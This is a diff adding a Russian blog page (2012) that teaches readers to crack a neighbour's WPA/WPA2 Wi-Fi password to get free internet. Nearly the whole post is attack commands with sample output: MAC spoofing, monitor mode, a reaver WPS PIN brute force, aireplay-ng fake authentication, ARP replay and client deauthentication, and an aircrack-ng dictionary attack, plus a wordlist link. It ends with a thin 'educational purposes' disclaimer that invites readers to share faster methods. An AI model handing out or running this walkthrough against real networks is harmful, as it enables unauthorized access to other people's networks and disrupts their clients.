@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+
+  <title>Неприступный wi-fi | UNIX-LAB.ORG</title>
+  <meta name="description" content="Рассмотрим две хитрых программы, способные раскрасить наши беспросветные будни яркими красками.">
+
+  <meta charset="utf-8">
+  <meta name="author" content="redVi">
+  <meta name="viewport" content="initial-scale=1.0, width=device-width" />
+  <link rel="icon" href="http://jekyll-unixlab.rhcloud.com/favicon.ico" type="image/x-icon">
+  <link rel="shortcut icon" href="http://jekyll-unixlab.rhcloud.com/favicon.ico" type="image/x-icon">
+  <link href="http://jekyll-unixlab.rhcloud.com/assets/stylesheets/screen.css" rel="stylesheet" type="text/css" />
+  <link rel="alternate" type="application/atom+xml" title="UNIX-LAB.ORG" href="http://jekyll-unixlab.rhcloud.com/feeds/atom.xml">
+  <link rel="alternate" type="application/rss+xml" title="UNIX-LAB.ORG" href="http://jekyll-unixlab.rhcloud.com/feeds/rss.xml">
+</head>
+<body>
+<div id="outer-wrapper">
+<div id="header-wrapper">
+    <a href="/"><div class="logo"></div></a>
+    <div class="small">блог об операционных системах, open source и программировании</div>
+<div class="nav">
+  <ul>
+    <li><a href="/archive/">Архив</a></li>
+    <li><a href="/about/">О блоге</a></li>
+    <li><a href="/author/">Автор</a></li>
+  </ul>
+</div>
+</div>
+
+<div id="main">
+<h2>Неприступный wi-fi</h2>
+<h5><i class="icon-feather"></i> 08 августа 2012
+
+ <i class="icon-bookmarks"></i>
+
+<a href="/tags/web.html">Web /</a>
+
+<a href="/tags/linux.html">Linux /</a>
+
+</h5>
+
+<p>Казалось бы, нет денег &mdash; нет интернета, путь к светлой беспроводной мечте закрыт и ничего здесь не попишешь. Но мы пойдём другим путём &mdash; обходным. Рассмотрим две хитрых программы, способные раскрасить наши беспросветные будни яркими красками. Всё нижеизложенное осуществлялось под управлением ОС Linux, но в Windows одна из используемых программ имеется точно и имя ей <code>aircrack-ng</code>.</p>
+
+<p><b>Задача:</b> получение пароля точки доступа WPA/PSK или WPA2/PSK.</p>
+
+<p>Предполагаемый алгоритм решения:</p>
+
+<h2 id="toc_0">Меняем мак-адрес:</h2>
+<div class="highlight"><pre><code class="console language-console" data-lang="console"><span class="gp">#</span> ifconfig wlan0 hw ether 00:00:00:00:00:00
+</code></pre></div>
+<p>где 00:00:00:00:00:00 &mdash; ваш новый MAC-адрес.</p>
+
+<p>При следующем входе в систему настройки будут сброшены.</p>
+
+<p>Поднимаем сеть:</p>
+<div class="highlight"><pre><code class="console language-console" data-lang="console"><span class="gp">#</span> ifconfig wlan0 up
+</code></pre></div>
+<h2 id="toc_1">Создаём виртуальный интерфейс:</h2>
+<div class="highlight"><pre><code class="console language-console" data-lang="console"><span class="gp">#</span> airmon-ng start wlan0
+</code></pre></div>
+<p>Заработает виртуальный интерфейс в режиме мониторинга, как правило он носит название mon0. Теперь необходимо просканировать сеть и выбрать предполагаемую жертву, дабы получить BSSID сети.</p>
+
+<h2 id="toc_2">Начинаем прослушивать эфир:</h2>
+<div class="highlight"><pre><code class="console language-console" data-lang="console"><span class="gp">#</span> airodump-ng mon0
+</code></pre></div>
+<p><img src="http://1.bp.blogspot.com/-IWElfzIH6tU/UCF15qF1ySI/AAAAAAAABJM/mn3KesP73EA/s1600/aircrack-ng.png" alt="mon0"></p>
+
+<h3 id="toc_3">Использование утилиты reaver</h3>
+
+<p>Получив необходимые сведения, вписываем их вместо подчёркнутых</p>
+<div class="highlight"><pre><code class="console language-console" data-lang="console"><span class="gp">$</span> sudo reaver -i mon0 -b 20:4E:7F:37:73:82 --channel 1 -vv
+</code></pre></div>
+<ul>
+<li>mon0 - наш виртуальный интерфейс</li>
+<li>ключ -b обозначает BSSID точки доступа</li>
+<li>channel 1 - пробуем достучаться до первого &quot;канала&quot;</li>
+<li>vv - расширенный вывод - нас будут уведомлять о происходящем</li>
+</ul>
+
+<p>Какой канал использует наш удалённый друг мы можем видеть в поле <code>CH</code>.</p>
+
+<p>Если всё складывается удачно, вывод должен быть примерно таким:</p>
+<div class="highlight"><pre><code class="text language-text" data-lang="text">[+] Switching mon0 to channel 1
+[+] Waiting for beacon from 20:4E:7F:37:73:82
+[+] Associated with 20:4E:7F:37:73:82 (ESSID: marisha24)
+[+] Trying pin 12345670
+</code></pre></div>
+<p>Вот и всё. Теперь остаётся только долго ждать пока нам на блюдечке не поднесут нужные сведения. Автором сего поста был использован именно этот метод, как наиболее простой. Нижеприведённые на текущий момент носят сугубо теоретический характер.</p>
+
+<h3 id="toc_4">Путь второй: продолжаем эксперименты с <code>aircrack-ng</code></h3>
+<div class="highlight"><pre><code class="console language-console" data-lang="console"><span class="gp">#</span> airodump-ng --channel 1 --write networks.dump mon0
+</code></pre></div>
+<ul>
+<li>где 1 - номер канала</li>
+<li>networks.dump - файл, в который будет сохранён результат</li>
+</ul>
+
+<p>В другой консоли начинаем повтор ARP-пакетов:</p>
+<div class="highlight"><pre><code class="console language-console" data-lang="console"><span class="gp">#</span> aireplay-ng --fakeauth 1 mon0 -e <span class="s2">&quot;linksys&quot;</span>
+<span class="gp">#</span> aireplay-ng --arpreplay mon0 -e <span class="s2">&quot;linksys&quot;</span>
+</code></pre></div>
+<ul>
+<li>где &quot;linksys&quot; - ESSID (имя) сети</li>
+</ul>
+
+<p>Возможно, понадобится ввести и BSSID, в данном случае для этого служит ключ <code>-a</code>:</p>
+<div class="highlight"><pre><code class="console language-console" data-lang="console"><span class="gp">$</span> sudo aireplay-ng --fakeauth 1 mon0 -e dan9iekb -a FC:75:16:CC:20:D8
+</code></pre></div>
+<p>и так далее</p>
+
+<p>Когда ARP-пакет будет найдет, программа начнет повторять его в эфир.</p>
+
+<p>Как только наберется достаточное количество пакетов (поле DATA, 30.000 пакетов должно быть достаточно), в следующей консоли подбираем пароль:</p>
+<div class="highlight"><pre><code class="console language-console" data-lang="console"><span class="gp">#</span> aircrack-ng networks.dump
+</code></pre></div>
+<p>Ну и ждём, соответственно. Занятие это долгое, параллельно на другой машине успеете <a href="http://www.unix-lab.org/posts/install-gentoo/">поставить gentoo</a>. И не только поставить, а даже настроить =)</p>
+
+<p>Либо ещё способ с тем же <code>aircrack</code>, опишу с нуля, дабы не запутать читателя:</p>
+<div class="highlight"><pre><code class="console language-console" data-lang="console"><span class="gp">#</span> airodump-ng mon0 - высматриваем жертву
+<span class="gp">#</span> airodump-ng -c 1 --bssid FC:75:16:CC:20:D8 -w data mon0 -  собираем данные о конкретной точке
+</code></pre></div>
+<p>Заставляем клиента переинициализироваться в сети:</p>
+<div class="highlight"><pre><code class="console language-console" data-lang="console"><span class="gp">#</span> aireplay-ng -deauth 3 -a MAC_AP -c MAC_Client mon0
+</code></pre></div>
+<ul>
+<li>где MAC_AP - ваш мак-адрес</li>
+<li>MAC_Client - адрес &quot;того парня&quot;</li>
+</ul>
+
+<p>Способ хорош тем, что не придётся накапливать пакеты</p>
+<div class="highlight"><pre><code class="console language-console" data-lang="console"><span class="gp">#</span> aircrack-ng -w wordlist capture_file
+</code></pre></div>
+<ul>
+<li>где wordlist – ваш словарь</li>
+<li>capture_file – файл с данными, с расширением cap</li>
+</ul>
+
+<p>Словари можно стянуть по адресу:</p>
+
+<p><a href="http://ftp.se.kde.org/pub/security/tools/net/Openwall/wordlists">http://ftp.se.kde.org/pub/security/tools/net/Openwall/wordlists</a></p>
+
+<p><b>P.S.</b> Автор не несёт ответственности за ваши действия. Вся информация предоставлена исключительно в ознакомительных целях. Автор не использует полученные в результате эксперимента сведения, не разглашает их и даже не помнит. Не смотря на это ввиду любопытности темы всем сведующим лицам предлагается вносить свои правки и дополнения в комментариях: это может быть более лучший/быстрый метод взлома, могут быть ссылки на качественные словари &mdash; что угодно.</p>
+
+
+<br />
+<p align="center"><a href="#">наверх</a></p>
+
+
+</div>
+</div>
+<div id="footer-wrapper">
+<ul class="footer">
+   <a href="/tags/android.html" class="set-1">android</a> <a href="/tags/arch.html" class="set-3">arch</a> <a href="/tags/blog.html" class="set-1">blog</a> <a href="/tags/debian.html" class="set-1">debian</a> <a href="/tags/decorations.html" class="set-1">decorations</a> <a href="/tags/editors.html" class="set-1">editors</a> <a href="/tags/gentoo.html" class="set-1">gentoo</a> <a href="/tags/git.html" class="set-1">git</a> <a href="/tags/kernel.html" class="set-1">kernel</a> <a href="/tags/latex.html" class="set-1">latex</a> <a href="/tags/linux.html" class="set-5">linux</a> <a href="/tags/python.html" class="set-2">python</a> <a href="/tags/ruby.html" class="set-1">ruby</a> <a href="/tags/server.html" class="set-2">server</a> <a href="/tags/web.html" class="set-1">web</a> <a href="/tags/windows.html" class="set-1">windows</a>
+</ul>
+<ul class="footer">
+    <li class="footer">&copy;&nbsp;2011&mdash;2013&nbsp;::</li>
+    <li class="footer"><a href="/">unix-lab.org</a>&nbsp;::</li>
+    <li class="footer">licensed under <a href="http://creativecommons.org/licenses/by-nc/3.0/deed.ru">CC BY-NC</a></li>
+</ul>
+</div>
+
+</body>
+</html>
